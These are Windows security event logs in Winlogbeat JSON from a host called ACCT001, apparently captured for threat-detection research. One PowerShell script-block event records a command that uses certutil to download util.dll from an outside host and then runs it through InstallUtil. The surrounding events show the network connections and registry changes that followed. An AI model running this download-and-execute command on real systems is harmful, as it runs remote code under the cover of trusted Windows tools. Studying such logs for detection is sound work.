{"@timestamp":"2019-10-28T02:31:41.369Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"message":"Completed invocation of ScriptBlock ID: 8e5bde63-9bcf-472d-9c11-517f260cd41a\nRunspace ID: 0081cb2b-4a53-48ac-bc50-97b1bfbc8d98","winlog":{"api":"wineventlog","record_id":1531,"activity_id":"{34b09f45-8ccf-0001-2d92-cb34cf8cd501}","channel":"Microsoft-Windows-PowerShell/Operational","event_data":{"RunspaceId":"0081cb2b-4a53-48ac-bc50-97b1bfbc8d98","ScriptBlockId":"8e5bde63-9bcf-472d-9c11-517f260cd41a"},"task":"Stopping Command","process":{"pid":2780,"thread":{"id":5228}},"provider_name":"Microsoft-Windows-PowerShell","computer_name":"ACCT001.shire.com","user":{"name":"lrodriguez","domain":"shire","type":"User","identifier":"S-1-5-21-2379224252-1048547738-3559495803-1113"},"opcode":"On create calls","event_id":4106,"version":1,"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"},"event":{"kind":"event","code":4106,"action":"Stopping Command","created":"2019-10-28T02:31:42.519Z"},"log":{"level":"verbose"},"ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:41.375Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"winlog":{"process":{"pid":4,"thread":{"id":5784}},"event_id":5158,"opcode":"Info","channel":"security","provider_name":"Microsoft-Windows-Security-Auditing","api":"wineventlog","record_id":41340,"task":"Filtering Platform Connection","computer_name":"ACCT001.shire.com","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","keywords":["Audit Success"],"event_data":{"SourcePort":"54981","Protocol":"6","FilterRTID":"0","LayerName":"%%14608","LayerRTID":"36","ProcessId":"3256","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","SourceAddress":"0.0.0.0"}},"event":{"code":5158,"action":"Filtering Platform Connection","created":"2019-10-28T02:31:42.519Z","kind":"event"},"log":{"level":"information"},"message":"The Windows Filtering Platform has permitted a bind to a local port.\n\nApplication Information:\n\tProcess ID:\t\t3256\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\n\nNetwork Information:\n\tSource Address:\t\t0.0.0.0\n\tSource Port:\t\t54981\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t0\n\tLayer Name:\t\tResource Assignment\n\tLayer Run-Time ID:\t36","agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat"},"winlog":{"process":{"pid":3208,"thread":{"id":5108}},"computer_name":"ACCT001.shire.com","opcode":"Info","version":2,"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"task":"Registry object added or deleted (rule: RegistryEvent)","api":"wineventlog","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_id":12,"record_id":271777,"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","event_data":{"UtcTime":"2019-10-28 02:31:42.220","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32","EventType":"CreateKey"}},"event":{"kind":"event","code":12,"action":"Registry object added or deleted (rule: RegistryEvent)","created":"2019-10-28T02:31:42.519Z"},"log":{"level":"information"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.370Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat"},"winlog":{"opcode":"To be used when operation is just executing a method","event_id":4103,"channel":"Microsoft-Windows-PowerShell/Operational","computer_name":"ACCT001.shire.com","activity_id":"{34b09f45-8ccf-0001-2c92-cb34cf8cd501}","version":1,"user":{"identifier":"S-1-5-21-2379224252-1048547738-3559495803-1113","name":"lrodriguez","domain":"shire","type":"User"},"provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","record_id":1532,"task":"Executing Pipeline","process":{"thread":{"id":5228},"pid":2780},"api":"wineventlog","event_data":{"Payload":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"","ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.1\n        Host ID = f0314d0f-c454-40a3-ad17-590da3d6c06e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.18362.1\n        Runspace ID = 0081cb2b-4a53-48ac-bc50-97b1bfbc8d98\n        Pipeline ID = 243\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 530\n        User = shire\\lrodriguez\n        Connected User = \n        Shell ID = Microsoft.PowerShell"},"provider_name":"Microsoft-Windows-PowerShell"},"event":{"code":4103,"action":"Executing Pipeline","created":"2019-10-28T02:31:42.530Z","kind":"event"},"log":{"level":"information"},"message":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.1\n        Host ID = f0314d0f-c454-40a3-ad17-590da3d6c06e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.18362.1\n        Runspace ID = 0081cb2b-4a53-48ac-bc50-97b1bfbc8d98\n        Pipeline ID = 243\n        Command Name = PSConsoleHostReadLine\n        Command Type = Function\n        Script Name = \n        Command Path = \n        Sequence Number = 530\n        User = shire\\lrodriguez\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.375Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t3256\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.100\n\tSource Port:\t\t54981\n\tDestination Address:\t172.18.39.102\n\tDestination Port:\t\t5985\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67260\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","winlog":{"channel":"security","provider_name":"Microsoft-Windows-Security-Auditing","task":"Filtering Platform Connection","version":1,"event_id":5156,"api":"wineventlog","computer_name":"ACCT001.shire.com","keywords":["Audit Success"],"record_id":41341,"opcode":"Info","process":{"thread":{"id":5784},"pid":4},"event_data":{"DestPort":"5985","SourceAddress":"172.18.39.100","Protocol":"6","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0","Application":"\\device\\harddiskvolume2\\windows\\system32\\svchost.exe","LayerName":"%%14611","Direction":"%%14593","DestAddress":"172.18.39.102","LayerRTID":"48","ProcessID":"3256","SourcePort":"54981","FilterRTID":"67260"},"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}"},"event":{"kind":"event","code":5156,"action":"Filtering Platform Connection","created":"2019-10-28T02:31:42.530Z"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"version":2,"process":{"pid":3208,"thread":{"id":5108}},"provider_name":"Microsoft-Windows-Sysmon","task":"Registry value set (rule: RegistryEvent)","user":{"domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18","name":"SYSTEM"},"event_data":{"EventType":"SetValue","UtcTime":"2019-10-28 02:31:42.220","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableFileTracing","Details":"DWORD (0x00000000)"},"api":"wineventlog","opcode":"Info","channel":"Microsoft-Windows-Sysmon/Operational","event_id":13,"record_id":271778,"computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"},"event":{"code":13,"action":"Registry value set (rule: RegistryEvent)","created":"2019-10-28T02:31:42.530Z","kind":"event"},"log":{"level":"information"},"message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableFileTracing\nDetails: DWORD (0x00000000)","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat"}}
{"@timestamp":"2019-10-28T02:31:41.376Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"A privileged service was called.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-2379224252-1048547738-3559495803-1113\n\tAccount Name:\t\tlrodriguez\n\tAccount Domain:\t\tshire\n\tLogon ID:\t\t0x6F86C\n\nService:\n\tServer:\tSecurity\n\tService Name:\t-\n\nProcess:\n\tProcess ID:\t0xe90\n\tProcess Name:\tC:\\Windows\\System32\\certutil.exe\n\nService Request Information:\n\tPrivileges:\t\tSeProfileSingleProcessPrivilege","winlog":{"channel":"security","computer_name":"ACCT001.shire.com","keywords":["Audit Failure"],"opcode":"Info","event_id":4673,"provider_name":"Microsoft-Windows-Security-Auditing","api":"wineventlog","process":{"pid":4,"thread":{"id":8320}},"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","record_id":41342,"task":"Sensitive Privilege Use","event_data":{"Service":"-","ProcessId":"0xe90","SubjectUserSid":"S-1-5-21-2379224252-1048547738-3559495803-1113","SubjectLogonId":"0x6f86c","SubjectDomainName":"shire","SubjectUserName":"lrodriguez","ObjectServer":"Security","PrivilegeList":"SeProfileSingleProcessPrivilege","ProcessName":"C:\\Windows\\System32\\certutil.exe"}},"event":{"kind":"event","code":4673,"action":"Sensitive Privilege Use","created":"2019-10-28T02:31:42.530Z"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.371Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"event_id":4104,"event_data":{"MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"certutil.exe -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u c:\\ProgramData\\util.dll","ScriptBlockId":"1a733ea3-9f8f-42b2-adbc-6e2dffdad223"},"api":"wineventlog","computer_name":"ACCT001.shire.com","activity_id":"{34b09f45-8ccf-0001-bcbd-cb34cf8cd501}","opcode":"On create calls","process":{"pid":2780,"thread":{"id":5228}},"task":"Execute a Remote Command","record_id":1533,"version":1,"user":{"identifier":"S-1-5-21-2379224252-1048547738-3559495803-1113","name":"lrodriguez","domain":"shire","type":"User"},"channel":"Microsoft-Windows-PowerShell/Operational","provider_name":"Microsoft-Windows-PowerShell","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"},"event":{"kind":"event","code":4104,"action":"Execute a Remote Command","created":"2019-10-28T02:31:42.530Z"},"log":{"level":"verbose"},"message":"Creating Scriptblock text (1 of 1):\ncertutil.exe -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /u c:\\ProgramData\\util.dll\n\nScriptBlock ID: 1a733ea3-9f8f-42b2-adbc-6e2dffdad223\nPath: ","ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","api":"wineventlog","process":{"thread":{"id":5108},"pid":3208},"user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"task":"Registry value set (rule: RegistryEvent)","opcode":"Info","computer_name":"ACCT001.shire.com","version":2,"channel":"Microsoft-Windows-Sysmon/Operational","record_id":271779,"event_data":{"Details":"DWORD (0x00000000)","EventType":"SetValue","UtcTime":"2019-10-28 02:31:42.220","ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableAutoFileTracing"},"event_id":13,"provider_name":"Microsoft-Windows-Sysmon"},"event":{"code":13,"action":"Registry value set (rule: RegistryEvent)","created":"2019-10-28T02:31:42.530Z","kind":"event"},"log":{"level":"information"},"message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableAutoFileTracing\nDetails: DWORD (0x00000000)","ecs":{"version":"1.1.0"}}
{"@timestamp":"2019-10-28T02:31:41.444Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"},"winlog":{"channel":"security","api":"wineventlog","keywords":["Audit Success"],"opcode":"Info","event_id":5158,"provider_name":"Microsoft-Windows-Security-Auditing","process":{"thread":{"id":5784},"pid":4},"task":"Filtering Platform Connection","computer_name":"ACCT001.shire.com","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","record_id":41343,"event_data":{"Application":"\\device\\harddiskvolume2\\windows\\system32\\certutil.exe","SourceAddress":"0.0.0.0","SourcePort":"54982","Protocol":"6","FilterRTID":"0","LayerName":"%%14608","LayerRTID":"36","ProcessId":"3728"}},"event":{"action":"Filtering Platform Connection","created":"2019-10-28T02:31:42.530Z","kind":"event","code":5158},"log":{"level":"information"},"message":"The Windows Filtering Platform has permitted a bind to a local port.\n\nApplication Information:\n\tProcess ID:\t\t3728\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\certutil.exe\n\nNetwork Information:\n\tSource Address:\t\t0.0.0.0\n\tSource Port:\t\t54982\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t0\n\tLayer Name:\t\tResource Assignment\n\tLayer Run-Time ID:\t36","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.371Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"event_id":4105,"activity_id":"{34b09f45-8ccf-0001-bcbd-cb34cf8cd501}","opcode":"On create calls","api":"wineventlog","channel":"Microsoft-Windows-PowerShell/Operational","task":"Starting Command","record_id":1534,"user":{"domain":"shire","type":"User","identifier":"S-1-5-21-2379224252-1048547738-3559495803-1113","name":"lrodriguez"},"computer_name":"ACCT001.shire.com","process":{"thread":{"id":5228},"pid":2780},"provider_name":"Microsoft-Windows-PowerShell","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","version":1,"event_data":{"RunspaceId":"0081cb2b-4a53-48ac-bc50-97b1bfbc8d98","ScriptBlockId":"1a733ea3-9f8f-42b2-adbc-6e2dffdad223"}},"event":{"kind":"event","code":4105,"action":"Starting Command","created":"2019-10-28T02:31:42.530Z"},"log":{"level":"verbose"},"message":"Started invocation of ScriptBlock ID: 1a733ea3-9f8f-42b2-adbc-6e2dffdad223\nRunspace ID: 0081cb2b-4a53-48ac-bc50-97b1bfbc8d98","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"}}
{"@timestamp":"2019-10-28T02:31:42.239Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"kind":"event","code":13,"action":"Registry value set (rule: RegistryEvent)","created":"2019-10-28T02:31:42.530Z"},"log":{"level":"information"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2019-10-28 02:31:42.220\nProcessGuid: {a158f72c-530d-5db6-0000-001011f7af00}\nProcessId: 5204\nImage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableConsoleTracing\nDetails: DWORD (0x00000000)","winlog":{"computer_name":"ACCT001.shire.com","opcode":"Info","version":2,"record_id":271780,"task":"Registry value set (rule: RegistryEvent)","api":"wineventlog","event_data":{"ProcessGuid":"{a158f72c-530d-5db6-0000-001011f7af00}","ProcessId":"5204","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Tracing\\InstallUtil_RASAPI32\\EnableConsoleTracing","Details":"DWORD (0x00000000)","EventType":"SetValue","UtcTime":"2019-10-28 02:31:42.220"},"provider_name":"Microsoft-Windows-Sysmon","event_id":13,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"channel":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","process":{"pid":3208,"thread":{"id":5108}}}}
{"@timestamp":"2019-10-28T02:31:41.446Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"event":{"kind":"event","code":5156,"action":"Filtering Platform Connection","created":"2019-10-28T02:31:42.530Z"},"log":{"level":"information"},"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t3728\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\certutil.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.100\n\tSource Port:\t\t54982\n\tDestination Address:\t172.18.39.8\n\tDestination Port:\t\t80\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67260\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","winlog":{"event_id":5156,"computer_name":"ACCT001.shire.com","keywords":["Audit Success"],"opcode":"Info","channel":"security","provider_name":"Microsoft-Windows-Security-Auditing","record_id":41344,"task":"Filtering Platform Connection","api":"wineventlog","process":{"pid":4,"thread":{"id":5784}},"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","version":1,"event_data":{"DestAddress":"172.18.39.8","DestPort":"80","Application":"\\device\\harddiskvolume2\\windows\\system32\\certutil.exe","FilterRTID":"67260","LayerName":"%%14611","ProcessID":"3728","SourceAddress":"172.18.39.100","SourcePort":"54982","Direction":"%%14593","Protocol":"6","LayerRTID":"48","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0"}}}
